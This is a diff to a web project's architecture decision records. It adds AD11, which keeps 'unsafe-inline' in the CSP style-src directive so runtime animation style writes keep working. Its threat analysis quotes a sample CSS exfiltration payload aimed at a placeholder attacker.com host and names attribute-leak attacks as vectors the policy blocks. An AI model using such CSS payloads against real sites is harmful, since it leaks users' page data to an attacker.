@@ -24,6 +24,7 @@ Each ADR documents a non-obvious design choice and the trade-offs considered. De
 | AD8 | Cookie attributes are the security contract — kept inline in REQ-AUTH-002/003 | Security | 2026-05-03 |
 | AD9 | Storage-shape names (D1 columns, KV keys) are the persistence contract — kept inline in REQ-DISC/AUTH/SET | Storage | 2026-05-03 |
 | AD10 | Atomic conditional UPDATE as the once-per-run idempotency gate — no `acquireOnceLock` helper | Architecture | 2026-05-03 |
+| AD11 | Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes for FLIP + view-transitions are intentional | Security | 2026-05-04 |
 
 ---
 
@@ -230,6 +231,50 @@ KV's eventual consistency made both races effectively undetectable via testing i
 - New gate sites SHOULD copy the pattern verbatim and document the meta.changes semantics inline; if a fourth or fifth site lands without the trigger refactor, this ADR is the place to revisit.
 
 **Related requirements:** [REQ-PIPE-008](../../sdd/generation.md#req-pipe-008-cross-chunk-semantic-dedup-pass)
+
+---
+
+### AD11: Keep `style-src 'unsafe-inline'`; runtime `.style.X` writes are intentional
+
+**Decision:** Retain `'unsafe-inline'` in the CSP `style-src` directive (`src/middleware/security-headers.ts`). Do not migrate FLIP animations or view-transition-name assignments away from runtime `.style.X` mutations.
+
+**Context:** Two architectural patterns in the codebase write to inline style attributes from JavaScript at runtime:
+
+1. **FLIP chip animations** (`src/lib/tag-railing-flip.ts`) — when the user toggles a hashtag, every chip in the tag strip measures its old and new positions, then writes `chip.style.transform = translate(${dx}px, ${dy}px)` on the inverse step and `chip.style.transform = 'translate(0,0)'` on the play step. The values are computed per-frame from real layout measurements; they cannot be enumerated at build time.
+
+2. **View-transition-name pre-flight** (`src/scripts/page-effects.ts`) — before an SPA navigation, the active card writes `link.style.setProperty('view-transition-name', card-${slug})` so the browser's View Transitions API can pair the source card with the destination article-detail header. The slug is per-article, not per-build.
+
+CSP3 `style-src` enforces the same allowlist on **runtime** style-attribute writes as on inline `<style>` blocks. Removing `'unsafe-inline'` blocks both patterns.
+
+**Alternatives considered:**
+
+- **`'unsafe-hashes'` directive (CSP3)** — allows hash-source to validate inline event handlers and `.style.X` writes. Requires a hash for every possible value. The FLIP transforms have continuous values (`translate(${dx}px, ${dy}px)`); enumeration is impossible. Rejected.
+
+- **CSS custom properties via `setProperty('--var', value)`** — write to `--flip-translate` against a static CSS rule `transform: var(--flip-translate)`. Browser behavior on whether `style-src` enforces against custom-property writes is **inconsistent across engines** (the values are stored as opaque token strings, not parsed CSS at write time). Could work, but relies on a gray-area interpretation; would need cross-browser verification. Rejected as fragile.
+
+- **Web Animations API rewrite** — `chip.animate([...])` runs entirely in JS, never touches the style attribute, CSP-exempt. Would require ~3-5h refactor of `tag-railing-flip.ts` plus a parallel rewrite of view-transition-name to use class toggles with a single fixed name. Working, but the security gain does not justify the regression risk on user-visible animation code that is hard to validate without a browser.
+
+- **Dynamic `<style nonce="...">` injection** — generate a per-request nonce, inject one `<style>` per FLIP frame, append/remove. Massive overhead per animation step; complicates the FLIP loop. Rejected.
+
+- **Migrate CSP entirely to Astro 6 `security.csp`** — Astro 6 emits per-page CSP via `<meta>` tag with auto-generated hashes. Combined with the middleware's response-header CSP, browsers enforce the intersection — and the runtime `.style.X` writes still wouldn't have hashes. Same fundamental blocker. Also blocked separately by the still-pinned `astro@5.18.1` (see `package.json`'s pin commit).
+
+**Rationale:** The actual security cost of `'unsafe-inline'` on `style-src`, given the rest of the policy, is small:
+
+- An XSS attacker who can inject CSS but not JS cannot run code or hijack the session — those vectors are blocked by the strict `script-src 'self'` (no inline scripts allowed).
+- The classic CSS exfiltration vector — `body { background: url(http://attacker.com/log?...) }` — requires an outbound network call, which is blocked by `connect-src 'self'` and the narrow `img-src 'self' data: gravatar`.
+- Attribute-leak attacks (`::before { content: attr(...) }` + URL load) are likewise blocked by `connect-src`.
+- `frame-ancestors 'none'` blocks UI redress / clickjacking via injected styles.
+
+Strict `script-src 'self'` is doing 95% of the XSS-prevention work. The marginal security gain from removing `'unsafe-inline'` on `style-src` does not justify replacing two well-understood, currently-shipping animation patterns with reimplementations on top of less-tested APIs. Many production sites run this exact combination (strict `script-src` + `'unsafe-inline'` style-src) deliberately.
+
+**Consequences:**
+
+- The CSP comment block in `src/middleware/security-headers.ts` documents `'unsafe-inline'` as required, and points at this ADR for the full reasoning.
+- A future contributor who proposes removing `'unsafe-inline'` from `style-src` MUST also propose a concrete alternative for the FLIP and view-transition-name mutation patterns. The "just drop it" path will reliably break production (this is the third time it has been attempted on this project — see `hotfix/csp-style-unsafe-inline` history).
+- If Astro ever ships native CSP support that handles runtime style mutations (e.g., via per-element nonces resolved at runtime), revisit this decision.
+- `tests/e2e/csp-violation.spec.ts` continues to act as the merge gate for any CSP tightening — it subscribes to `securitypolicyviolation` events on a live `/digest` navigation and fails the build if any fire.
+
+**Related requirements:** [REQ-OPS-003](../../sdd/operations.md#req-ops-003-baseline-browser-security-headers), [CON-SEC-001](../../sdd/constraints.md#con-sec-001-strict-content-security-policy)
 
 ---
 
